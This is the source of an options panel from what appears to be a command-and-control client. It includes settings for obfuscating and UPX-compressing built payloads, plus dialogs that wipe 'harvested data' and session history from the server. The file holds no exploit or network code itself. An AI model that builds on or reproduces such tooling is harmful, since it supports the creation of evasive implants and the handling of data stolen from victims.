# C2_Client/ui/options_pane.py
from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QGroupBox, QComboBox, 
                             QPushButton, QLabel, QFormLayout, QCheckBox, QMessageBox, QHBoxLayout)
from PyQt6.QtCore import pyqtSignal

class OptionsPane(QWidget):
    sign_out_requested = pyqtSignal()
    setting_changed = pyqtSignal(str, object)
    panel_reset_requested = pyqtSignal()
    sanitize_requested = pyqtSignal()
    delete_account_requested = pyqtSignal() # New signal for deleting the account
    
    def __init__(self, db_manager):
        super().__init__()
        self.db = db_manager
        layout = QVBoxLayout(self)
        layout.addWidget(QLabel("<h2>OPTIONS</h2>"))
        
        # --- Appearance Settings ---
        appearance_group = QGroupBox("Appearance")
        appearance_layout = QFormLayout(appearance_group)
        appearance_layout.setContentsMargins(10, 15, 10, 10)
        self.theme_selector = QComboBox()
        self.theme_selector.addItems([
            "Dark (Default)", "Light", "Cyber", "Matrix", 
            "Sunrise", "Sunset", "Jungle", "Ocean", "Galaxy", "Candy"
        ])
        self.theme_selector.currentTextChanged.connect(lambda val: self.setting_changed.emit("theme", val))
        appearance_layout.addRow("Theme:", self.theme_selector)

        self.reset_panels_button = QPushButton("Reset Panel Sizing")
        self.reset_panels_button.clicked.connect(self.panel_reset_requested)
        appearance_layout.addRow(self.reset_panels_button)
        
        layout.addWidget(appearance_group)
        
        # --- Build Process Settings ---
        build_group = QGroupBox("Build Process")
        build_layout = QFormLayout(build_group)
        build_layout.setContentsMargins(10, 15, 10, 10)
        self.compression_selector = QComboBox()
        self.compression_selector.addItems(["None", "Normal (UPX)"])
        self.compression_selector.currentTextChanged.connect(lambda val: self.setting_changed.emit("compression", val))
        build_layout.addRow("Compression:", self.compression_selector)
        self.obfuscation_selector = QComboBox()
        self.obfuscation_selector.addItems(["None", "Light", "Heavy"])
        self.obfuscation_selector.currentTextChanged.connect(lambda val: self.setting_changed.emit("obfuscation", val))
        build_layout.addRow("Obfuscation Level:", self.obfuscation_selector)
        self.build_priority_combo = QComboBox()
        self.build_priority_combo.addItems(["Normal", "Low", "High"])
        self.build_priority_combo.currentTextChanged.connect(lambda val: self.setting_changed.emit("build_priority", val))
        build_layout.addRow("Process Priority:", self.build_priority_combo)
        self.simple_logs_toggle = QCheckBox("Use Simple Build Logs (Recommended)")
        self.simple_logs_toggle.stateChanged.connect(lambda state: self.setting_changed.emit("simple_logs", bool(state)))
        build_layout.addRow(self.simple_logs_toggle)
        layout.addWidget(build_group)
        
        layout.addStretch()
        
        # --- DANGER ZONE ---
        danger_group = QGroupBox("Danger Zone") # Renamed from "Caution Zone"
        danger_layout = QHBoxLayout(danger_group) # Changed to QHBoxLayout for side-by-side buttons
        danger_layout.setContentsMargins(10, 15, 10, 10)

        self.sanitize_button = QPushButton("Sanitize Data") # Renamed from "Sanitize All Data"
        self.sanitize_button.setObjectName("SanitizeButton")
        self.sanitize_button.clicked.connect(self.confirm_sanitize)
        
        self.delete_account_button = QPushButton("Delete Account") # New button
        self.delete_account_button.setObjectName("DeleteAccountButton") # Set object name for styling
        self.delete_account_button.clicked.connect(self.confirm_delete_account)

        danger_layout.addWidget(self.sanitize_button) # Add sanitize button to the left
        danger_layout.addWidget(self.delete_account_button) # Add delete button to the right

        layout.addWidget(danger_group)

        self.sign_out_button = QPushButton("Sign Out")
        self.sign_out_button.clicked.connect(self.sign_out_requested)
        layout.addWidget(self.sign_out_button)
        
        self.load_settings()
        
    def load_settings(self):
        """Loads all saved settings from the database and applies them to the UI."""
        self.theme_selector.setCurrentText(self.db.load_setting("theme", "Dark (Default)"))
        self.compression_selector.setCurrentText(self.db.load_setting("compression", "None"))
        self.obfuscation_selector.setCurrentText(self.db.load_setting("obfuscation", "None"))
        self.build_priority_combo.setCurrentText(self.db.load_setting("build_priority", "Normal"))
        self.simple_logs_toggle.setChecked(self.db.load_setting("simple_logs", True))

    def confirm_sanitize(self):
        """Shows a confirmation dialog before emitting the sanitize signal."""
        msg_box = QMessageBox(self)
        msg_box.setWindowTitle("CONFIRM SANITIZE")
        msg_box.setText("<b><font color='red'>WARNING: THIS IS IRREVERSIBLE.</font></b>")
        msg_box.setInformativeText(
            "This will command the server to permanently delete all session history and harvested data for your account.\n\n"
            "Are you absolutely sure you want to proceed?"
        )
        msg_box.setIcon(QMessageBox.Icon.Warning)
        msg_box.setStandardButtons(QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        msg_box.setDefaultButton(QMessageBox.StandardButton.No)
        
        if msg_box.exec() == QMessageBox.StandardButton.Yes:
            self.sanitize_requested.emit()
            
    def confirm_delete_account(self):
        """Shows a confirmation dialog before emitting the delete_account signal."""
        msg_box = QMessageBox(self)
        msg_box.setWindowTitle("CONFIRM ACCOUNT DELETION")
        msg_box.setText("<b><font color='red'>WARNING: THIS IS PERMANENT AND IRREVERSIBLE.</font></b>")
        msg_box.setInformativeText(
            "This will permanently delete your user account and all associated data (sessions, vault, etc.).\n\nYou will be logged out immediately.\n\n"
            "Are you absolutely sure you want to proceed?"
        )
        msg_box.setIcon(QMessageBox.Icon.Critical) # Use a more severe icon
        msg_box.setStandardButtons(QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        msg_box.setDefaultButton(QMessageBox.StandardButton.No)
        
        if msg_box.exec() == QMessageBox.StandardButton.Yes:
            self.delete_account_requested.emit()